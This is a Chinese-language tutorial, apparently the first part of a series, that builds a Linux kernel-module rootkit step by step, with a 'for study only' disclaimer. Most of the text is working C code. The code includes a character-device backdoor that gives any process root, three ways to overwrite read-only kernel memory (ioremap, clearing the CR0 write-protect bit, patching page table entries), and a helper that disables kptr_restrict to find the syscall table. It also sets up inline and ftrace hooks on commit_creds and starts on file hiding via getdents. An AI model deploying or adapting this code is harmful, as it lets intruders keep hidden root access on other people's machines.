# 0x00.一切开始之前

「Rootkit」即「root
kit」，直译为中文便是「根权限工具包」的意思，在今天的语境下更多指的是一种被作为驱动程序、加载到操作系统内核中的恶意软件。Linux 下的 rootkit
主要以「可装载内核模块」的形式存在，作为内核的一部分直接以 ring0
权限向入侵者提供服务。由于rootkit本身作为内核的一部分运行于内核态，其可以实现很多特殊的功能。

本系列文章将对 Linux 下基于 LKM 的 rootkit 实现技术进行汇总，主要基于 x86 架构， **仅供实验与学习，请勿用作违法犯罪：(**

> 注：本文选用 v6.2.1 的内核源码

## PRE. 基础的 LKM

接下来笔者将以如下 LKM 作为基础进行改造，对不同的 rootkit 技术进行试验：

> a3rootkit.c
    
    
    #include <linux/module.h>
    #include <linux/kernel.h>
    #include <linux/init.h>
    #include <linux/fs.h>
    #include <linux/device.h>
    
    #define DEVICE_NAME "a3rootkit"
    #define CLASS_NAME "a3rootkit"
    
    static int major_num;
    static struct class *module_class;
    static struct device *module_device;
    
    static int a3_rootkit_open(struct inode *, struct file *);
    static ssize_t a3_rootkit_read(struct file *, char __user *, size_t, loff_t *);
    static ssize_t a3_rootkit_write(struct file *, const char __user *, size_t, loff_t *);
    static int a3_rootkit_release(struct inode *, struct file *);
    static long a3_rootkit_ioctl(struct file *, unsigned int, unsigned long);
    
    static struct file_operations a3_rootkit_ops = {
        .open = a3_rootkit_open,
        .read = a3_rootkit_read,
        .write = a3_rootkit_write,
        .release = a3_rootkit_release,
        .unlocked_ioctl = a3_rootkit_ioctl,
    };
    
    static int __init a3_rootkit_init(void)
    {
        int err_code;
    
        printk(KERN_INFO"[a3_rootkit:] Module loaded. Start to register device...");
    
        /* register major num as char device */
        major_num = register_chrdev(0, DEVICE_NAME, &a3_rootkit_ops);
        if(major_num < 0) {
            printk(KERN_INFO "[a3_rootkit:] Failed to register a major number.\n");
            err_code = major_num;
            goto err_major;
        }    
        printk(KERN_INFO "[a3_rootkit:] Register complete, major number: %d\n", 
               major_num);
    
        /* create device class */
        module_class = class_create(THIS_MODULE, CLASS_NAME);
        if(IS_ERR(module_class)) {
            printk(KERN_INFO "[a3_rootkit:] Failed to register class device!\n");
            err_code = PTR_ERR(module_class);
            goto err_class;
        }
        printk(KERN_INFO "[a3_rootkit:] Class device register complete.\n");
    
        /* create device file */
        module_device = device_create(module_class, NULL, MKDEV(major_num, 0), 
                                      NULL, DEVICE_NAME);
        if(IS_ERR(module_device)) {
            printk(KERN_INFO "[a3_rootkit:] Failed to create the device!\n");
            err_code = PTR_ERR(module_device);
            goto err_dev;
        }
        printk(KERN_INFO "[a3_rootkit:] Module loaded successfully.");
    
        return 0;
    
    err_dev:
        class_destroy(module_class);
    err_class:
        unregister_chrdev(major_num, DEVICE_NAME);
    err_major:
        return err_code;
    }
    
    static void __exit a3_rootkit_exit(void)
    {
        device_destroy(module_class, MKDEV(major_num, 0));
        class_destroy(module_class);
        unregister_chrdev(major_num, DEVICE_NAME);
        printk(KERN_INFO "[a3_rootkit:] Module clean up. See you next time.");
    }
    
    static int a3_rootkit_open(struct inode *inode, struct file *file)
    {
        return 0;
    }
    
    static ssize_t a3_rootkit_read(struct file *file, char __user *buf, 
                                   size_t count, loff_t *start)
    {
        return count;
    }
    
    static ssize_t a3_rootkit_write(struct file *file, const char __user *buf, 
                                    size_t count, loff_t *start)
    {
        return count;
    }
    
    static int a3_rootkit_release(struct inode *inode, struct file *file)
    {
        return 0;
    }
    
    static long a3_rootkit_ioctl(struct file *file, unsigned int cmd, 
                                 unsigned long arg)
    {
        return 0;
    }
    
    module_init(a3_rootkit_init);
    module_exit(a3_rootkit_exit);
    MODULE_LICENSE("GPL");
    MODULE_AUTHOR("arttnba3");
    

> Makefile
    
    
    obj-m += a3rootkit.o
    CURRENT_PATH := $(shell pwd)
    LINUX_KERNEL := $(shell uname -r)
    LINUX_KERNEL_PATH := /usr/src/linux-headers-$(LINUX_KERNEL)
    all:
        make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules
    clean:
        make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean
    

> 之所以不选择 procfs 是因为内核 API 在不同版本间改动较大，懒得做适配了 ：(

# 0x01. 进程提权

一个进程的权限由其 PCB （即 `task_struct` 结构体）中指定的 `cred` 结构体决定，位于内核空间中的 rootkit
可以很方便地通过修改、替换`cred` 结构体等方式来帮助我们的恶意进程进行提权：）

## 一、为当前进程提权

我们可以通过 `current` 宏直接获取到当前进程的 `task_struct` ，从而完成对 `cred` 的访问与修改

#### 方法 ①：直接修改当前进程的 cred

直接将 `cred` 的 `uid`、`gid` 等字段修改为 0 即可完成提权，下面是笔者给出的示例代码

    
    
    static ssize_t a3_rootkit_write(struct file *file, const char __user *buf, 
                                    size_t count, loff_t *start)
    {
        static char usr_data[0x100];
        int sz = count > 0x100 ? 0x100 : count;
    
        copy_from_user(usr_data, buf, sz);
    
        if (!strncmp(usr_data, "root", 4)) {
            struct cred *curr = current->cred;
            curr->uid = curr->euid = curr->suid = curr->fsuid = KUIDT_INIT(0);
            curr->gid = curr->egid = curr->sgid = curr->fsgid = KGIDT_INIT(0);
        }
    
        return sz;
    }
    

运行，完成提权：

![](./img/1920054031143995126.png)

#### 方法 ②：复制 init 进程的 cred

在老版本内核上可以直接通过 `commit_creds(prepare_kernel_cred(NULL))` 完成提权，但是在较新版本的内核当中
`prepare_kernel_cred(NULL)` 会分配失败，不过 `prepare_kernel_cred()` 函数本质上是拷贝复制一个进程的
`cred` ，因此我们不难想到的是 **我们可以直接复制有 root 权限的 init 进程的 cred**

虽然 init 进程的 PCB `init_task` 与 credential `init_cred`
都是静态分配的，但是这两个符号不一定会导出，且直接在内存中进行搜索也不简单，不过 **init 进程是所有进程最终的父进程，其父进程为其自身**
，因此我们可以直接通过 `task_struct->parent` 不断向上直接找到 `init_task` 后
`commit_creds(prepare_kernel_cred(&init_task))` 完成提权，示例代码如下：

    
    
    struct task_struct *a3_rootkit_find_root_task(void)
    {
        struct task_struct *tsk;
    
        tsk = current;
        while (tsk != tsk->parent) {
            tsk = tsk->parent;
        }
    
        return tsk;
    }
    
    static ssize_t a3_rootkit_write(struct file *file, const char __user *buf, 
                                    size_t count, loff_t *start)
    {
        static char usr_data[0x100];
        int sz = count > 0x100 ? 0x100 : count;
    
        copy_from_user(usr_data, buf, sz);
    
        if (!strncmp(usr_data, "root", 4)) {
            commit_creds(prepare_kernel_cred(a3_rootkit_find_root_task()));
        }
    
        return sz;
    }
    

运行，完成提权：

![](./img/1124026101725044323.png)

## 二、为指定进程提权

我们可以直接通过 `pid_task(find_vpid(arg), PIDTYPE_PID)` 来找到进程 id 所对应的
`task_struct`，从而直接修改对应进程的权限，现笔者给出为指定进程提权的示例代码：

    
    
    void a3_rootkit_get_root_privilege(int pid)
    {
        struct task_struct *p;
        struct cred *c;
    
        p = pid_task(find_vpid(pid), PIDTYPE_PID);
        if (!p) {
            return;
        }
    
        c = p->cred;
        c->uid = c->euid = c->suid = c->fsuid = KUIDT_INIT(0);
        c->gid = c->egid = c->sgid = c->fsgid = KGIDT_INIT(0);
    }
    

使用如下例程进行测试：

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <sys/ioctl.h>
    
    #define ROOT_PRIVILEGE 0x1919
    
    int main(int argc, char **argv, char **envp)
    {
        int dev_fd = open("/dev/a3rootkit", O_RDONLY);
    
        if (argc < 2) {
            return 0;
        }
    
        ioctl(dev_fd, ROOT_PRIVILEGE, atoi(argv[1]));
    }
    

成功将指定进程提权到 root

![](./img/2224607655420519133.png)

# 0x02. 函数劫持

rootkit 通常需要修改内核部分函数逻辑来达成特定目的，例如劫持 `getdents`
系统调用来完成文件隐藏等；劫持函数的方法多种多样，本节笔者将给出一些比较经典的方案

## PRE. 修改只读代码/数据段

系统代码段、一些静态定义的函数表（包括系统调用表在内）的 **权限通常都被设为只读， 我们无法直接修改这些区域的内容**
，因此我们还需要一些手段来绕过只读保护，这里笔者给出常见的几种方法

#### 方法 ①：利用 ioremap 完成物理内存直接改写（推荐）

对虚拟地址空间的访问实际上是对指定物理页面的访问，我们可以通过 **将目标物理页框映射到新的可写虚拟内存** 的方式完成对只读内存区域数据的覆写

我们可以直接通过 `virt_to_phys()` 、`virt_to_pfn()` 等宏获取到目标区域虚拟地址对应的物理地址后再通过
`ioremap()` 将目标物理页框重新映射到一个新的虚拟地址上即可完成对只读内存数据的改写

数据覆写完成后再 `iounmap()` 即可，示例代码如下：

    
    
    void a3_rootkit_write_read_only_mem_by_ioremap(void *dst, void *src, size_t len)
    {
        size_t dst_phys_page_addr, dst_offset;
        size_t dst_ioremap_addr;
    
        dst_phys_page_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;
        dst_offset = (size_t) dst & 0xfff;
    
        dst_ioremap_addr = (size_t) ioremap(dst_phys_page_addr, len + 0x1000);
        memcpy(dst_ioremap_addr + dst_offset, src, len);
        iounmap(dst_ioremap_addr);
    }
    

> 虽然 direct mapping area 有着对所有物理内存的映射，但是 **也根据映射的区域权限进行了相应的权限设置** （例如映射 text
> 段的页面为可读可执行权限），因此我们无法通过这块区域进行覆写，而需要重新建立新的映射
>
> 因此 `kmap()` 同样无法帮助我们完成对只读区域的改写，因为其会先检查相应的 `page` 是否已经在 direct mapping area
> 上有着对应的映射并进行复用 ：(

简单测试一下，成功在不修改 cr0 寄存器的情况下改写只读内存：

![](./img/8666720409599812979.png)

#### 方法 ②：修改 cr0 寄存器

只读保护的开关其实是由 cr0 寄存器中的 `write protect` 位决定的，只要我们能够将 cr0 的这一位置 0 便能关闭只读保护，
**从而直接改写内存中只读区域的数据**

> 这也是上古时期比较经典的一些 rootkit 的实现方案

![](./img/6154293480849640828.png)

直接写内联汇编即可，这里笔者给出一个通用的改写内存只读区域的代码：

    
    
    size_t a3_rootkit_read_cr0(void)
    {
        size_t cr0;
    
        asm volatile (
            "movq  %%cr0, %%rax;"
            "movq  %%rax, %0;   "
            : "=r" (cr0) :: "%rax"
        );
    
        return cr0;
    }
    
    void a3_rootkit_write_cr0(size_t cr0)
    {
        asm volatile (
            "movq   %0, %%rax;  "
            "movq  %%rax, %%cr0;"
            :: "r" (cr0) : "%rax"
        );
    }
    
    void a3_rootkit_disable_write_protect(void)
    {
        size_t cr0_val;
    
        cr0_val = a3_rootkit_read_cr0();
    
        /* if already disable, do nothing */
        if ((cr0_val >> 16) & 1) {
            cr0_val &= ~(1 << 16);
            a3_rootkit_write_cr0(cr0_val);
        }
    }
    
    void a3_rootkit_enable_write_protect(void)
    {
        size_t cr0_val;
    
        cr0_val = a3_rootkit_read_cr0();
    
        /* if already enable, do nothing */
        if (!((cr0_val >> 16) & 1)) {
            cr0_val |= (1 << 16);
            a3_rootkit_write_cr0(cr0_val);
        }
    }
    
    void a3_rootkit_write_read_only_mem_by_cr0(void *dst, void *src,size_t len)
    {
        size_t orig_cr0;
    
        orig_cr0 = a3_rootkit_read_cr0();
    
        a3_rootkit_disable_write_protect();
    
        memcpy(dst, src, len);
    
        /* if write protection is originally disabled, just do nothing */
        if ((orig_cr0 >> 16) & 1) {
            a3_rootkit_enable_write_protect();
        }
    }
    

简单测试一下，成功修改只读区域内存：

![](./img/3523269177695481470.png)

> 需要注意的是，对控制寄存器的读写操作为敏感操作， **可以被基于虚拟化技术的反病毒软件截获** ，因此这里笔者并不推荐使用该方法完成对物理内存的改写

#### 方法 ③：直接修改内核页表项

操作系统对于内存页读写权限的控制实际上是通过设置页表项中对应的标志位来完成的：

![](./img/8149536680728136672.png)

因此我们也可以 **通过直接修改对应页表项的方式完成对只读内存的读写** ，下面笔者给出如下示例代码：

    
    
    #include <asm/pgtable_types.h>
    
    void a3_rootkit_write_romem_by_pte_patch(void *dst, void *src, size_t len)
    {
        pte_t *dst_pte;
        pte_t orig_pte_val;
        unsigned int level;
    
        dst_pte = lookup_address((unsigned long) dst, &level);
        orig_pte_val.pte = dst_pte->pte;
    
        dst_pte->pte |= _PAGE_RW;
        memcpy(dst, src, len);
    
        dst_pte->pte = orig_pte_val.pte;
    }
    

简单测试一下，成功在不修改 cr0 寄存器的情况下修改只读内存：

![](./img/966898063429614166.png)

## 一、查找系统调用表

当进行系统调用时实际上会通过 **系统调用表** 获取到对应系统调用的函数指针后进行调用（`syscall_nr→syscall_func`
的指针数组），因此我们可以很方便的通过该表获取到不同系统调用的函数地址， **并通过劫持该表以劫持系统调用流程** ：

    
    
    asmlinkage const sys_call_ptr_t sys_call_table[] = {
    #include <asm/syscalls_64.h>
    };
    

但系统调用表符号是不导出的 :（ 因此我们还需要通过其他的方式找到系统调用表的地址

系统调用对应的函数其实是在编译期[动态生成](https://kernel.googlesource.com/pub/scm/linux/kernel/git/axboe/linux-block/+/aio-poll-ring/arch/x86/entry/syscalls/syscall_64.tbl)的，而生成的这些函数符号会导出到
kallsyms 中，因此我们可以通过搜索函数指针的方式来查找系统调用表的位置：）

但是在较高版本的内核当中 kallsyms 相关的符号 _仍然是不导出的_ ，因此这里笔者选择采用 **在用户态启动一个新进程读取
/proc/kallsyms 的方式** 来完成对 kallsyms 的读取，用户态程序如下：

    
    
    #include <stdio.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <stdlib.h>
    #include <sys/ioctl.h>
    
    #define USER_KALLSYMS 0x114
    
    int main(int argc, char **argv, char **envp)
    {
        int dev_fd;
        FILE *kallsyms_file, *dmesg_restrict_file, *kptr_restrict_file;
        struct {
            size_t kaddr;
            char type;
            char name[0x100];
        } kinfo;
        size_t kern_seek_data[4];
        int orig_dmesg_restrict, orig_kptr_restrict;
        int syscall_count = 0;
        char dmesg_recover_cmd[0x100], kptr_recover_cmd[0x100];
    
        /* backup and change dmesg and kptr restrict */
        dmesg_restrict_file = fopen("/proc/sys/kernel/dmesg_restrict", "r");
        kptr_restrict_file = fopen("/proc/sys/kernel/kptr_restrict", "r");
        fscanf(dmesg_restrict_file, "%d", &orig_dmesg_restrict);
        fscanf(kptr_restrict_file, "%d", &orig_kptr_restrict);
        system("echo 0 > /proc/sys/kernel/dmesg_restrict");
        system("echo 0 > /proc/sys/kernel/kptr_restrict");
    
        /* read /proc/kallsyms */
        kallsyms_file = fopen("/proc/kallsyms", "r");
    
        while (syscall_count != 4) {
            fscanf(kallsyms_file, "%lx %c %100s", 
                   &kinfo.kaddr, &kinfo.type, &kinfo.name);
    
            if (!strcmp("__x64_sys_read", kinfo.name)) {
                kern_seek_data[0] = kinfo.kaddr;
                syscall_count++;
            } else if (!strcmp("__x64_sys_write", kinfo.name)) {
                kern_seek_data[1] = kinfo.kaddr;
                syscall_count++;
            } else if (!strcmp("__x64_sys_open", kinfo.name)) {
                kern_seek_data[2] = kinfo.kaddr;
                syscall_count++;
            } else if (!strcmp("__x64_sys_close", kinfo.name)) {
                kern_seek_data[3] = kinfo.kaddr;
                syscall_count++;
            }
        }
    
        /* send data to kernel */
        dev_fd = open("/dev/a3rootkit", O_RDWR);
        printf("/dev/a3rootkit fd: %d\n", dev_fd);
        ioctl(dev_fd, USER_KALLSYMS, kern_seek_data);
    
        /* recover dmesg and kptr restrict */
        snprintf(dmesg_recover_cmd, 0x100, 
                "echo %d > /proc/sys/kernel/dmesg_restrict", orig_dmesg_restrict);
        snprintf(kptr_recover_cmd, 0x100, 
                "echo %d > /proc/sys/kernel/kptr_restrict", orig_kptr_restrict);
        system(dmesg_recover_cmd);
        system(kptr_recover_cmd);
    
        return 0;
    }
    

通过如下代码启动用户进程并接收用户空间读取的 kallsyms 数据：

    
    
    void a3_rootkit_find_syscall_table(void)
    {
        size_t *phys_mem = (size_t*) page_offset_base;
        char *argv[] = {
            "/root/a3rootkit/kallsyms",
            NULL,
        };
        char *envp[] = {
            "HOME=/",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
            NULL,
        };
    
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    
        if (!get_syscall_table_data) {
            panic("failed to read syscall table in userspace!");
        }
    
        for (size_t i = 0; 1; i++) {
            /* we only need to compare some of that */
            if (phys_mem[i] == syscall_table_data[0]
                && phys_mem[i + 1] == syscall_table_data[1]
                && phys_mem[i + 2] == syscall_table_data[2]
                && phys_mem[i + 3] == syscall_table_data[3]) {
                syscall_table = &phys_mem[i];
                printk(KERN_INFO "[a3_rootkit:] found syscall_table at: %lx", 
                       syscall_table);
                break;
            }
        }
    }
    
    //...
    
    static long a3_rootkit_ioctl(struct file *file, unsigned int cmd, 
                                 unsigned long arg)
    {
        switch (cmd) {
            case USER_KALLSYMS:
                copy_from_user(syscall_table_data, arg, sizeof(syscall_table_data));
                get_syscall_table_data = 1;
                break;
    

## 二、函数表 hook

包括系统调用在内，内核中的大部分系统调用其实都是通过调用函数表中的函数指针完成的，因此我们可以直接通过劫持特定表中的函数指针的方式来完成 hook

笔者将在后文的一些具体场景下给出该技术的示例

## 三、 inline hook

**内联钩子** （inline hook）算是一个比较经典的思路，其核心原理是 **将函数内的 hook 点位修改为一个 jmp
指令，使其跳转到恶意代码处执行** ，完成恶意代码的执行之后再恢复执行被 jmp 指令所覆盖的部分指令，之后跳转回原 hook
点位的下一条指令继续执行，这样便在保证了原函数基础功能的情况下完成了恶意代码执行

![](./img/5544237960710756722.png)

通过 `Intel SDM` 我们可以很方便地获取到 jmp 指令的格式，从而编写相应的跳转指令，并通过前文的修改只读内存函数来完成对代码段的改写

![](./img/8574233065326963257.png)

但由于 x86 为 CISC 指令集， **指令长度并不固定** ，因此 inline hook 往往需要一个额外且庞大的模块来帮我们识别 hook
点位的数条指令，这令 inline hook 的流程变得较为复杂 ：(

> 在 Github 上也有一些开源的 inline hook 框架，如大名鼎鼎的
> [Reptile](https://github.com/f0rb1dd3n/Reptile) 使用的便是非常经典的
> [khook](https://github.com/milabs/khook) （典中典组合了这下）

### 动态 inline hook 技术

常规的 inline hook 不仅要将 hook 点位的代码 patch 为 jmp 指令，还需要识别与保存 hook
点位上的指令以在恶意代码执行完后恢复这些指令的执行再跳转执行 hook 点位的后续代码，x86 指令集的非定长的特性使得这套流程变得异常繁琐：(

现在笔者给出一种新的 inline hook 方法，笔者称之为 **动态 inline hook 技术** ，其基本流程如下：

  * 保存 hook 点位上的数据（无需识别指令，只需要保存 `jmp` 长度的数据）
  * 修改 hook 点位上的指令为 `jmp` 指令，使其在执行时会跳转到我们的恶意函数
  * 在恶意函数中 **恢复 hook 点位上数据的原值，随后调用 hook 点位** （function call）
  * **重新将 hook 点位上指令修改为`jmp` 指令**，之后进行正常的函数返回

这种方法 **不会破坏函数调用栈，也不需要对 hook 点位上的原指令进行识别** ，大幅简化了 hook 流程 ：）

现笔者给出如下的 **通用 hook 框架** 代码，我们只需要 **为不同的 hook 点位定义不同的**
`a3_rootkit_evil_hook_fn_temp()` **函数与不同的** `hook_info` **结构体** ，之后调用
`a3_rootkit_text_hook（）` 即可完成对指定代码位置的 hook：

    
    
    #define HOOK_BUF_SZ 0x30
    
    struct hook_info {
        char hook_data[HOOK_BUF_SZ];
        char orig_data[HOOK_BUF_SZ];
        void (*hook_before) (size_t *args);
        size_t (*orig_func) (size_t, size_t, size_t, size_t, size_t, size_t);
        size_t (*hook_after) (size_t orig_ret, size_t *args);
    };
    
    /* template */
    struct hook_info temp_hook_info;
    
    size_t a3_rootkit_evil_hook_fn_temp(size_t arg0, size_t arg1, size_t arg2, 
                                        size_t arg3, size_t arg4, size_t arg5)
    {
        size_t args[6], ret;
    
        args[0] = arg0;
        args[1] = arg1;
        args[2] = arg2;
        args[3] = arg3;
        args[4] = arg4;
        args[5] = arg5;
    
        /* patch the original function and call the original and hook functions */
        if (temp_hook_info.hook_before) {
            temp_hook_info.hook_before(args);
        }
    
        a3_rootkit_write_read_only_mem_by_ioremap(temp_hook_info.orig_func, 
                                                  temp_hook_info.orig_data, 
                                                  HOOK_BUF_SZ);
        ret = temp_hook_info.orig_func(args[0], args[1], args[2], 
                                        args[3], args[4], args[5]);
    
        if (temp_hook_info.hook_after) {
            ret = temp_hook_info.hook_after(ret, args);
        }
    
        /* re-patch the hook point again */
        a3_rootkit_write_read_only_mem_by_ioremap(temp_hook_info.orig_func, 
                                                  temp_hook_info.hook_data, 
                                                  HOOK_BUF_SZ);
    
        return ret;
    }
    
    void a3_rootkit_text_hook(void *hook_dst, void *new_dst, struct hook_info *info)
    {
        size_t jmp_offset;
    
        /* save the original hook info */
        info->orig_func = hook_dst;
        memcpy(&info->orig_data, info->orig_func, HOOK_BUF_SZ);
    
        /* let it jmp to evil func */
        jmp_offset = (size_t) new_dst - (size_t) hook_dst - 12;
        info->hook_data[0] = 0xE9;
        *(size_t *) (&info->hook_data[1]) = jmp_offset;
    
        a3_rootkit_write_read_only_mem_by_ioremap(info->orig_func, &info->hook_data,
                                                  HOOK_BUF_SZ);
    }
    

这里我们以 `commit_cred()` 作为范例进行测试：

    
    
    static int __init a3_rootkit_init(void)
    {
        //...
        void test_func_1(size_t args[])
        {
            printk(KERN_ERR "[test hook] aaaaaaaaaaaaaaaaaaaaaaaaaaaa");
        }
        size_t test_func_2(size_t ret, size_t args[])
        {
            printk(KERN_ERR "[test hook] bbbbbbbbbbbbbbbbbbbbbbbbbbbb");
            return ret;
        }
    
        temp_hook_info.hook_before = test_func_1;
        temp_hook_info.hook_after = test_func_2;
        a3_rootkit_text_hook(commit_creds, a3_rootkit_evil_hook_fn_temp, 
                             &temp_hook_info);
    

成功在不改变原函数基础功能的情况下完成 hook：

![](./img/3582087851137348827.png)

## 四、ftrace hook

`ftrace` 是内核提供的一个调试框架，当内核开启了 `CONFIG_FUNCTION_TRACER` 编译选项时我们可以使用 `ftrace`
来追踪内核中的函数调用

`ftrace` 通过在函数开头插入 `fentry()` 或 `mcount()` 实现，为了降低性能损耗，在编译时会在函数的开头插入 `nop`
指令，当开启 frace 时再动态地将待跟踪函数开头的 `nop` 指令替换为跳转指令：

![](./img/713350898424481335.png)

以 `commit_creds()` 为例，插入 ftrace 的跳转点前后如下：

![](./img/4304049076417928039.png)

![](./img/243081085371811994.png)

利用 `ftrace` ，我们可以非常方便地 hook 内核中的大部分函数：）

>
> 这里其实可以直接使用[一些现成的框架](https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1)，不过本文主要是为了学习技术背后的原理，因此笔者不会选择使用一些现有的框架，而是会从头开始重新写：）

`ftrace` 的核心结构是 `ftrace_ops`，用来表示一个 hook 点的基本信息，通常我们只需要用到 `func` 和 `flags`
两个成员：

    
    
    typedef void (*ftrace_func_t)(unsigned long ip, unsigned long parent_ip,
                      struct ftrace_ops *op, struct ftrace_regs *fregs);
    //...
    
    
    struct ftrace_ops {
        ftrace_func_t           func;
        struct ftrace_ops __rcu     *next;
        unsigned long           flags;
        //...
    };
    

当我们创建好一个 `ftrace_ops` 之后，我们便可以使用 `ftrace_set_filter_ip()` 将其注册到 filter
中，也可以使用该函数将一个 `ftrace_ops` 从 filter 中删除：

    
    
    /**
     * ftrace_set_filter_ip - set a function to filter on in ftrace by address
     * @ops - the ops to set the filter with
     * @ip - the address to add to or remove from the filter.
     * @remove - non zero to remove the ip from the filter
     * @reset - non zero to reset all filters before applying this filter.
     *
     * Filters denote which functions should be enabled when tracing is enabled
     * If @ip is NULL, it fails to update filter.
     *
     * This can allocate memory which must be freed before @ops can be freed,
     * either by removing each filtered addr or by using
     * ftrace_free_filter(@ops).
     */
    int ftrace_set_filter_ip(struct ftrace_ops *ops, unsigned long ip,
                 int remove, int reset)
    

当我们将一个 `ftrace_ops` 添加到 filter 中后，我们可以使用 `register_ftrace_function()` 将其放置到
hook 点位上；而在我们将其从 filter 中删除之前，我们需要调用 `unregister_ftrace_function()` 将其从 hook
点上脱离；下面是笔者给出的示例代码：

    
    
    struct ftrace_ops* a3_rootkit_ftrace_hook_install(void *hook_dst, 
                                                      ftrace_func_t new_dst)
    {
        struct ftrace_ops *hook_ops;
        int err;
    
        hook_ops = kmalloc(GFP_KERNEL, sizeof(*hook_ops));
        hook_ops->func = new_dst;
        hook_ops->flags = FTRACE_OPS_FL_SAVE_REGS
                        | FTRACE_OPS_FL_RECURSION
                        | FTRACE_OPS_FL_IPMODIFY;
    
        err = ftrace_set_filter_ip(hook_ops, hook_dst, 0, 0);
        if (err) {
            printk(KERN_ERR "[a3_rootkit:] failed to set ftrace filter.");
            goto failed;
        }
    
        err = register_ftrace_function(hook_ops);
        if (err) {
            printk(KERN_ERR "[a3_rootkit:] failed to register ftrace fn.");
            goto failed;
        }
    
        printk(KERN_INFO "[a3_rootkit:] register ftrace hook at %p", hook_dst);
    
        return hook_ops;
    
    failed:
        kfree(hook_ops);
        return NULL;
    }
    
    int a3_rootkit_ftrace_hook_remove(struct ftrace_ops *hook_ops, void *hook_dst)
    {
        int err;
    
        err = unregister_ftrace_function(hook_ops);
        if (err) {
            printk(KERN_ERR "[a3_rootkit:] failed to unregister ftrace.");
            goto out;
        }
    
        err = ftrace_set_filter_ip(hook_ops, hook_dst, 1, 0);
        if (err) {
            printk(KERN_ERR "[a3_rootkit:] failed to rmove ftrace point.");
            goto out;
        }
    
    out:
        return err;
    }
    

这里我们还是以 `commit_cred()` 作为范例进行测试，在我们自定义的 `hook` 点当中我们可以通过 `fregs`
参数直接改变任一寄存器的值，由于 ftrace 的 hook 点位于函数开头，尚未开辟该函数的栈空间，这里我们可以选择将 `rip` 直接改为一条
`ret` 指令从而使其直接返回，之后我们再在 hook 函数中重新调用原函数的功能部分即可，这里需要注意的是要跳过开头的 `endbr64` \+
`call` 两条指令总计 9 字节：

    
    
    __attribute__((naked)) void ret_fn(void)
    {
        asm volatile (" ret; ");
    }
    
    void test_hook_fn(unsigned long ip, unsigned long pip,
                        struct ftrace_ops *ops, struct ftrace_regs *fregs)
    {
        size_t (*orig_commit_creds)(size_t) = \
                                    (size_t(*)(size_t))((size_t) commit_creds + 9);
    
        printk(KERN_ERR "[test hook] bbbbbbbbbbbbbbbbbbbbbbbbbbbb");
    
        fregs->regs.ax = orig_commit_creds(fregs->regs.di);
        fregs->regs.ip = ret_fn;
    
        return ;
    }
    
    static int __init a3_rootkit_init(void)
    {
        //...
        a3_rootkit_ftrace_hook_install(commit_creds, test_hook_fn);
    

成功在不改变原函数基础功能的情况下插入了 hook：

![](./img/1504426051908840403.png)

# 0x03. 文件隐藏

我们的 rootkit 既然要长久驻留在系统上，那么在系统每一次开机时都应当载入我们的 rootkit，这就要求 **我们的 rootkit
文件还需要保留在硬盘上** ，同时我们有的时候也需要启动一些用户态进程来帮助我们完成一些任务， **用户态进程的二进制文件也需要我们进行隐藏**
，除此之外我们可能也想要隐藏一些日志文件...

因此接下来我们还要完成相关文件的隐藏的工作

> 注：本节需要你提前对 VFS 有着一定的了解：）

## 一、劫持 getdents 系统调用核心函数

当我们使用 `ls` 查看某个目录下的文件时，实际上会调用到 `getdents64()` / `getdents()` /
`compat_getdents()` 这三个系统调用之一来获取某个目录下的文件信息，并以如下形式的结构体数组返回：

    
    
    /* getdents */
    struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char        d_name[1];
    };
    
    /* getdents64 */
    struct linux_dirent64 {
        u64     d_ino;
        s64     d_off;
        unsigned short  d_reclen;
        unsigned char   d_type;
        char        d_name[];
    };
    

而用来遍历文件的系统调用的核心逻辑实际上都是通过 `iterate_dir()` 来实现的：

    
    
    SYSCALL_DEFINE3(getdents, unsigned int, fd,
            struct linux_dirent __user *, dirent, unsigned int, count)
    {
        struct fd f;
        struct getdents_callback buf = {
            .ctx.actor = filldir,
            .count = count,
            .current_dir = dirent
        };
        int error;
    
        f = fdget_pos(fd);
        if (!f.file)
            return -EBADF;
    
        error = iterate_dir(f.file, &buf.ctx);
    
    //...
    
    SYSCALL_DEFINE3(getdents64, unsigned int, fd,
            struct linux_dirent64 __user *, dirent, unsigned int, count)
    {
        struct fd f;
        struct getdents_callback64 buf = {
            .ctx.actor = filldir64,
            .count = count,
            .current_dir = dirent
        };
        int error;
    
        f = fdget_pos(fd);
        if (!f.file)
            return -EBADF;
    
        error = iterate_dir(f.file, &buf.ctx);
    
    //...
    
    COMPAT_SYSCALL_DEFINE3(getdents, unsigned int, fd,
            struct compat_linux_dirent __user *, dirent, unsigned int, count)
    {
        struct fd f;
        struct compat_getdents_callback buf = {
            .ctx.actor = compat_filldir,
            .current_dir = dirent,
            .count = count
        };
        int error;
    
        f = fdget_pos(fd);
        if (!f.file)
            return -EBADF;
    
        error = iterate_dir(f.file, &buf.ctx);
    

而在 `iterate_dir()` 中实际上会调用对应文件的函数表中的 `iterate_shared` / `iterate` 函数：

    
    
    int iterate_dir(struct file *file, struct dir_context *ctx)
    {
        struct inode *inode = file_inode(file);
        bool shared = false;
        int res = -ENOTDIR;
        if (file->f_op->iterate_shared)
            shared = true;
        else if (!file->f_op->iterate)
            goto out;
    
        //...
        if (!IS_DEADDIR(inode)) {
            ctx->pos = file->f_pos;
            if (shared)
                res = file->f_op->iterate_shared(file, ctx);
            else
                res = file->f_op->iterate(file, ctx);
            //...
    

以 ext4 文件系统为例，其实际上会调用到 `ext4_readdir` 函数：

    
    
    const struct file_operations ext4_dir_operations = {
        .llseek     = ext4_dir_llseek,
        .read       = generic_read_dir,
        .iterate_shared = ext4_readdir,
    

存在如下调用链：

    
    
    ext4_readdir()
        ext4_dx_readdir()// htree-indexed 文件系统会调用到这个（通常都是）
            call_filldir()
                dir_emit()
                    ctx->actor() // 填充返回给用户的数据缓冲区
    

填充返回给用户的数据的核心逻辑便是调用 `ctx->actor()`， **也就是调用 filldir/filldir64/compat_filldir
函数** ，这也是大部分文件系统对于 `iterate/iterate_shared` 的实现核心之一，而这类函数的作用其实是
**将文件遍历的单个结果填充回用户空间**

